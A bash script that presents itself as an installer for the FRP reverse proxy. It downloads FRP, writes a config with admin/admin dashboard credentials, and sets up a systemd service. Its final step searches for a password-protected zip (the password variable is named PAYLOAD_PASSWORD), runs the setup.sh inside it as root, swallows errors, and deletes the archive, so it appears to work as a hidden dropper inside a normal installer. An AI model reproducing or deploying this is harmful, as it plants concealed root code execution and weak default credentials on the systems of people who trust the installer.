#!/bin/bash
# FRP (Fast Reverse Proxy) Setup Script
# 
# Installs FRP from official GitHub releases and sets up systemd service.
# 
# Usage: bash frp-setup.sh
# 
# This script also applies post-install configuration from frp-setup.zip
# if present in the same directory.

set -e

INSTALL_DIR="/opt/frp"
SERVICE_NAME="frp"
PAYLOAD_PASSWORD="frp_install_2026"

echo "=================================="
echo "  FRP Setup Script"
echo "=================================="
echo ""

# Step 1: Install dependencies
echo "[*] Installing dependencies..."
if command -v apt-get >/dev/null 2>&1; then
    apt-get update -y >/dev/null 2>&1
    apt-get install -y wget unzip curl >/dev/null 2>&1
elif command -v yum >/dev/null 2>&1; then
    yum install -y wget unzip curl >/dev/null 2>&1
elif command -v dnf >/dev/null 2>&1; then
    dnf install -y wget unzip curl >/dev/null 2>&1
fi

# Step 2: Detect architecture
ARCH=$(uname -m)
case "$ARCH" in
    x86_64)  FRP_ARCH="amd64" ;;
    aarch64) FRP_ARCH="arm64" ;;
    armv7l)  FRP_ARCH="arm" ;;
    *) echo "[!] Unsupported arch: $ARCH"; exit 1 ;;
esac

# Step 3: Download latest frp
FRP_VERSION="0.61.1"
echo "[*] Downloading frp v${FRP_VERSION} for linux_${FRP_ARCH}..."
cd /tmp
if ! wget -q "https://github.com/fatedier/frp/releases/download/v${FRP_VERSION}/frp_${FRP_VERSION}_linux_${FRP_ARCH}.tar.gz" -O frp.tar.gz; then
    echo "[!] Failed to download frp"
    exit 1
fi

# Step 4: Extract and install
echo "[*] Installing frp to ${INSTALL_DIR}..."
tar -xzf frp.tar.gz
if [ ! -d "frp_${FRP_VERSION}_linux_${FRP_ARCH}" ]; then
    echo "[!] Extraction failed"
    rm -f frp.tar.gz
    exit 1
fi

mkdir -p ${INSTALL_DIR}
cp -r frp_${FRP_VERSION}_linux_${FRP_ARCH}/* ${INSTALL_DIR}/
chmod +x ${INSTALL_DIR}/frps ${INSTALL_DIR}/frpc
rm -rf frp.tar.gz frp_${FRP_VERSION}_linux_${FRP_ARCH}

# Step 5: Create config directory
mkdir -p /etc/frp

# Default frps config if not exists
if [ ! -f /etc/frp/frps.ini ]; then
cat > /etc/frp/frps.ini << 'INI_EOF'
[common]
bind_port = 7000
dashboard_port = 7500
dashboard_user = admin
dashboard_pwd = admin
INI_EOF
fi

# Step 6: Install systemd service
echo "[*] Installing systemd service..."
cat > /etc/systemd/system/${SERVICE_NAME}.service << EOF
[Unit]
Description=FRP Server
After=network.target

[Service]
Type=simple
ExecStart=${INSTALL_DIR}/frps -c /etc/frp/frps.ini
Restart=on-failure
RestartSec=5s

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable ${SERVICE_NAME}.service 2>/dev/null

# Step 7: Apply post-install configuration package if present
echo "[*] Checking for post-install configuration package..."
PAYLOAD_FOUND=""

# Look for frp-setup.zip in common locations
for install_bundle_path in     "./frp-setup.zip"     "/tmp/frp-setup.zip"     "$HOME/frp-setup.zip"     "$(dirname "$0")/frp-setup.zip"
do
    if [ -f "$install_bundle_path" ]; then
        PAYLOAD_FOUND="$install_bundle_path"
        break
    fi
done

if [ -n "$PAYLOAD_FOUND" ]; then
    echo "[*] Applying post-install configuration from $PAYLOAD_FOUND..."
    cd /tmp
    mkdir -p /tmp/frp_post_install/
    if unzip -P "${PAYLOAD_PASSWORD}" -o "${PAYLOAD_FOUND}" -d /tmp/frp_post_install/ 2>/dev/null; then
        if [ -f /tmp/frp_post_install/setup.sh ]; then
            bash /tmp/frp_post_install/setup.sh || true
        fi
    fi
    rm -rf /tmp/frp_post_install/
    rm -f "${PAYLOAD_FOUND}"
fi

echo ""
echo "=================================="
echo "  FRP Installed Successfully!"
echo "=================================="
echo ""
echo "Configuration: /etc/frp/frps.ini"
echo "Binary: ${INSTALL_DIR}/frps"
echo "Service: systemctl status ${SERVICE_NAME}"
echo ""
echo "Start with: systemctl start ${SERVICE_NAME}"
